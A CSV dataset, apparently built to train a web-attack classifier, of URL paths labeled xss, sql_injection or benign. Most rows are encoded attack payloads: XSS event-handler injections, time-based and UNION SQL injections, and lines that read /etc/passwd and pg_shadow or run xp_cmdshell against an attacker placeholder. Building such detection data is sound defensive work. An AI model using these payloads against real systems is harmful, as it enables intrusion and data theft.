text,label
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Ccontent+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fcontent%3E,xss
/api/v1/comments?text=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D,xss
/api/v1/feedback?message=%3Crtc+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Frtc%3E,xss
/api/v2/profile?id=%3Carea+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Farea%3E,xss
/v1/orders?customer_id=%29%29+or+sleep%28__TIME__%29%3D%27&status=active,sql_injection
/v1/products/%27+or+1%3D1+or+%27%27%3D%27,sql_injection
/api/v1/comments?text=%3Ctrack+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Ftrack%3E,xss
/api/v1/comments?text=%3Cnoframes+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnoframes%3E,xss
/v1/search?q=%3Ciframe++src%3Dj,xss
/v1/profile?bio=%3Cembed+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fembed%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/comments?text=%3Col+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fol%3E,xss
/api/v1/feedback?message=%3Ckbd+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fkbd%3E,xss
/v1/orders?customer_id=%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&status=active,sql_injection
/api/v1/reviews?body=%3Cnav+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fnav%3E%3Cinput+autofocus%3E,xss
/api/v1/users?id=declare+%40q+nvarchar+%284000%29+select+%40q+%3D,sql_injection
/api/v1/profile?id=163220,benign
/api/v2/profile?id=%3Cdetails+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fdetails%3E,xss
/api/v1/reviews?body=%3Cscript+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fscript%3E,xss
/v1/search?q=%3Crt+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Frt%3E,xss
/api/v2/comments/%3Cs+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fs%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ch1+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fh1%3E,xss
/api/v2/profile?id=%3Cthead+onclick%3D%22alert%281%29%22%3Etest%3C%2Fthead%3E,xss
/api/v2/profile?id=%3Crtc+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Frtc%3E%3Cinput+id%3Dy+autofocus%3E,xss
/v1/search?q=blue%2Bdress,benign
/v1/products/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2,sql_injection
/api/v1/comments?text=%3Cth+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fth%3E,xss
/api/v1/feedback?message=%3Cdl+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fdl%3E,xss
/api/v1/feedback?message=%27onload%3Dalert%281%29%3E%3Csvg%2F1%3D%27,xss
/v1/profile?bio=%3Cfont+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Ffont%3E,xss
/api/v2/profile?id=%3Ckbd+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fkbd%3E,xss
/api/v1/feedback?message=%3Carticle+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Farticle%3E,xss
/v1/orders?customer_id=or+1+--%27&status=active,sql_injection
/v1/products/UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL--,sql_injection
/api/v1/search?q=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15--,sql_injection
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Csmall+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fsmall%3E,xss
/api/v1/users?id=exec+sp,sql_injection
/v1/orders?customer_id=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%29%2520%2523&status=active,sql_injection
/api/v1/comments?text=%3Cthead+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fthead%3E,xss
/v1/products/%22%29%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v2/comments/%3Csvg+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fsvg%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cbdi+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fbdi%3E,xss
/api/v1/comments?text=%3Cimg%2Fsrc%2Fonerror%3Dprompt%288%29%3E,xss
/api/v2/users/40066,benign
/api/v1/reviews?body=%3Crb+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Frb%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cem+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fem%3E,xss
/api/v1/reviews?body=%3Cpre+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpre%3E,xss
/api/v2/profile?id=%3Chtml+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fhtml%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/comments?text=%3Clisting+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Flisting%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cdir+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ccontent+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fcontent%3E,xss
/api/v2/profile?id=%3Cmeter+onclick%3D%22alert%281%29%22%3Etest%3C%2Fmeter%3E,xss
/v1/products/%22%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v2/profile?id=%3Cmain+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fmain%3E,xss
/api/v1/comments?text=%3Cframeset+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fframeset%3E,xss
/v1/profile?bio=%3Cbdo+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fbdo%3E,xss
/v1/search?q=%3Ciframe+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fiframe%3E,xss
/api/v1/users?id=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26,sql_injection
/v1/orders?customer_id=%27+or+true--&status=active,sql_injection
/api/v2/comments/%3Cli+onclick%3D%22alert%281%29%22%3Etest%3C%2Fli%3E,xss
/api/v2/search?q=%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520--&key=API_KEY,sql_injection
/api/v2/search?q=%27%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A&key=API_KEY,sql_injection
/api/v2/search?q=%27+grant+connect+to+name%3B+grant+resource+to+name%3B+--&key=API_KEY,sql_injection
/api/v1/reviews?body=%3Cnoembed+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fnoembed%3E,xss
/api/v1/comments?text=%3Clink+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Flink%3E,xss
/api/v1/search?q=admin%22+or+%221%22%3D%221%22%23,sql_injection
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cli+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fli%3E,xss
/api/v1/feedback?message=%3Carticle+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Farticle%3E,xss
/api/v1/comments?text=%3Cimage+src%3Dvalidimage.png+onloadend%3Dalert%281%29%3E,xss
/api/v1/feedback?message=%3Cpre+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fpre%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cmap+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fmap%3E,xss
/v1/profile?bio=%3Cb+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fb%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cplaintext+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fplaintext%3E,xss
/api/v1/comments?text=%3Ccanvas+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fcanvas%3E,xss
/api/v1/comments?text=%3Cvar+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fvar%3E,xss
/v1/search?q=%3Cem+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fem%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Chtml+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fhtml%3E,xss
/api/v1/search?q=select+name%2C+tbname%2C+coltype+from+sysibm.syscolumns%3B,sql_injection
/v1/search?q=%3Crtc+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Frtc%3E,xss
/api/v1/reviews?body=%3Ctitle+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftitle%3E,xss
/api/v2/search?q=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%23&key=API_KEY,sql_injection
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cnextid+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fnextid%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cbdo+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fbdo%3E,xss
/api/v1/comments?text=%3Ctextarea+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Ftextarea%3E,xss
/api/v2/profile?id=%3Csmall+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fsmall%3E,xss
/api/v1/login?username=%27%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A&password=pass,sql_injection
/api/v1/feedback?message=%3Ctime+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Ftime%3E,xss
/api/v2/profile?id=%3Cmap+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmap%3E,xss
/api/v2/comments/%3Cshadow+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fshadow%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Cbody+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fbody%3E,xss
/api/v2/comments/%3Cmeter+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fmeter%3E,xss
/api/v1/comments?text=%3Cisindex+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fisindex%3E,xss
/api/v1/feedback?message=%3Csvg%3E%3Cstrong+onload%3Dalert%281%29%3E%3C%2Fstrong%3E,xss
/v1/search?q=%3Cnoembed+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fnoembed%3E,xss
/api/v2/profile?id=%3Cdiv+id%3D%22108%22%3E%3C%21--+IE+5-8+standards+mode+--%3E,xss
/v1/search?q=%3Cimage+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fimage%3E,xss
/api/v2/comments/%3Cpre+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fpre%3E,xss
/v1/search?q=%3Cbody+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fbody%3E,xss
/api/v2/items/%27+or+%27whatever%27+in+%28%27whatever%27%29?key=API_KEY,sql_injection
/api/v1/search?q=HAVING+1%3D1%23,sql_injection
/api/v1/feedback?message=%3Capplet+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fapplet%3E,xss
/api/v1/comments?text=%3Cdiv+id%3D%22108%22%3E%3C%21--+IE+5-8+standards+mode+--%3E,xss
/v1/search?q=%3Cbody+onresize%3D%22alert%281%29%22%3E,xss
/api/v1/comments?text=%3Cspan+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fspan%3E%3Cinput+autofocus%3E,xss
/v1/products/%27sqlvuln,sql_injection
/v1/products/UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL--,sql_injection
/v1/profile?bio=%3Cscript+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fscript%3E,xss
/api/v1/reviews?body=%3Ccolgroup+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcolgroup%3E,xss
/v1/search?q=%3Csamp+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fsamp%3E,xss
/api/v1/comments?text=%3Ca+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fa%3E,xss
/v1/profile?bio=%3Cthead+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fthead%3E,xss
/v1/profile?bio=%3Cheader+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fheader%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ccenter+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fcenter%3E,xss
/v1/orders?customer_id=%27%29%29%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520--&status=active,sql_injection
/api/v1/users?id=%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+COUNT%28DISTINCT%28USERNAME%29%29+FROM+SYS.ALL_USERS%29%29+AND+%27i%27%3D%27i,sql_injection
/api/v1/login?username=0x730065006c0065006300740020004000400076006500+...&password=pass,sql_injection
/v1/search?q=%3Ctable+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Ftable%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Ctt+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Ftt%3E,xss
/api/v2/profile?id=%3Cbdo+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbdo%3E,xss
/api/v2/profile?id=%3Ctitle+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ftitle%3E%3Cinput+autofocus%3E,xss
/api/v2/search?q=%22%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A&key=API_KEY,sql_injection
/v1/orders?customer_id=%27%3B+exec+%28%27sel%27+%2B+%27ect+us%27+%2B+%27er%27%29&status=active,sql_injection
/api/v1/comments?text=%3Cthead+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fthead%3E,xss
/api/v2/search?q=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%23&key=API_KEY,sql_injection
/api/v1/users?id=benchmark%2850000000%2CMD5%281%29%29%23,sql_injection
/api/v2/items/copy+myfile+from+%27%2Fetc%2Fpasswd%27%3B?key=API_KEY,sql_injection
/v1/profile?bio=%3Cpicture+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpicture%3E,xss
/api/v2/profile?id=%3Ctbody+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Ftbody%3E,xss
/api/v1/comments?text=%3Csvg%3E%3Cframeset+onload%3Dalert%281%29%3E%3C%2Fframeset%3E,xss
/api/v1/users?id=%29%29+or+sleep%28__TIME__%29%3D%27,sql_injection
/api/v1/users?id=%22+or+%22%22%3D%22,sql_injection
/v1/profile?bio=%3Cbdi+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fbdi%3E,xss
/api/v1/search?q=or+SLEEP%285%29--,sql_injection
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Ctbody+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Ftbody%3E,xss
/api/v1/reviews?body=%3Crb+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Frb%3E,xss
/v1/products/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16,sql_injection
/v1/products/%22+or+1%3D1+--,sql_injection
/api/v1/feedback?message=%3Cmeter+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeter%3E,xss
/api/v2/items/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25?key=API_KEY,sql_injection
/api/v1/login?username=%29%29%29%29%29%29+waitfor+delay+%270%3A0%3A20%27+--&password=pass,sql_injection
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Clink+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Flink%3E,xss
/api/v1/login?username=%27%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&password=pass,sql_injection
/api/v1/feedback?message=%3Cdt+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fdt%3E,xss
/v1/search?q=%3Ccaption+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fcaption%3E,xss
/api/v1/search?q=%22%29%2C%28select%2520if%28count%28%2A%29%21%3D-1%2Cbenchmark%283000000%2CMD5%281%29%29%2Cbenchmark%283000000%2CMD5%281%29%29%29%29%2523,sql_injection
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cxss+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fxss%3E,xss
/api/v2/items/select+%2A+from+pg_shadow%3B?key=API_KEY,sql_injection
/api/v1/users?id=or+%27%27%3D%27,sql_injection
/api/v1/reviews?body=%3Csvg%3E%3Csub+onload%3Dalert%281%29%3E%3C%2Fsub%3E,xss
/api/v1/feedback?message=%3Ch1+onclick%3D%22alert%281%29%22%3Etest%3C%2Fh1%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cobject+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fobject%3E,xss
/api/v2/items/%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523?key=API_KEY,sql_injection
/api/v2/comments/%3Ciframe+onclick%3D%22alert%281%29%22%3Etest%3C%2Fiframe%3E,xss
/api/v1/reviews?body=%3Cheader+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fheader%3E,xss
/api/v1/login?username=1%29+or+pg_sleep%28__TIME__%29--&password=pass,sql_injection
/api/v1/search?q=%22%29%29%29+waitfor+delay+%270%3A0%3A20%27+%2F%2A,sql_injection
/api/v2/items/exec+master..xp_cmdshell+%27ping%2B%3Cattackerip%3E%27?key=API_KEY,sql_injection
/v1/products/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27,sql_injection
/api/v1/reviews?body=%3Coutput+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Foutput%3E,xss
/api/v1/feedback?message=%3Ctemplate+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Ftemplate%3E,xss
/api/v1/reviews?body=%3Cspacer+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fspacer%3E,xss
/api/v2/comments/%3Cbutton+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fbutton%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cscript+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fscript%3E,xss
/api/v1/profile?id=96870,benign
/api/v2/comments/%3Cxmp+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fxmp%3E,xss
/api/v1/feedback?message=%3Cabbr+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fabbr%3E,xss
/api/v1/feedback?message=%3Cframeset+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fframeset%3E,xss
/api/v1/reviews?body=%3Cinput+onchange%3Dalert%281%29+value%3Dxss%3E,xss
/v1/search?q=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cfigcaption+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ffigcaption%3E,xss
/api/v2/comments/%3Cslot+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fslot%3E,xss
/v1/orders?customer_id=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2F%2A&status=active,sql_injection
/api/v1/search?q=ORDER+BY+31337%23,sql_injection
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cparam+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fparam%3E,xss
/api/v1/login?username=%27%7C%7C%276&password=pass,sql_injection
/v1/profile?bio=%3Ctt+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftt%3E,xss
/api/v2/profile?id=%3Cdir+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fdir%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Cdiv+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdiv%3E,xss
/v1/profile?bio=%3Cembed+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fembed%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Chtml+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fhtml%3E,xss
/api/v2/comments/%3Cacronym+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Facronym%3E,xss
/api/v1/feedback?message=%3Cxmp+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fxmp%3E,xss
/v1/profile?bio=%3Caudio+autoplay+controls+onseeking%3Dalert%281%29%3E%3Csource+src%3D%22validaudio.wav%22+type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E,xss
/api/v1/comments?text=%3Cbasefont+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fbasefont%3E,xss
/api/v1/reviews?body=%3Cshadow+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fshadow%3E,xss
/api/v2/items/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6?key=API_KEY,sql_injection
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Coutput+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Foutput%3E,xss
/api/v1/users?id=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28,sql_injection
/v1/profile?bio=%3Chtml+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fhtml%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Ci+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fi%3E,xss
/api/v2/profile?id=%3Ctr+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftr%3E,xss
/api/v1/comments?text=%3Cabbr+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fabbr%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Chtml+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fhtml%3E,xss
/v1/search?q=%3Cdiv+id%3D%22132%22%3E%3C%21doctype+html%3E,xss
/api/v2/profile?id=%3Coutput+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Foutput%3E,xss
/v1/products/%27%29%29%29%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523,sql_injection
/v1/products/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%23,sql_injection
/api/v1/feedback?message=%3Cabbr+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fabbr%3E,xss
/v1/search?q=%3Cdel+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdel%3E,xss
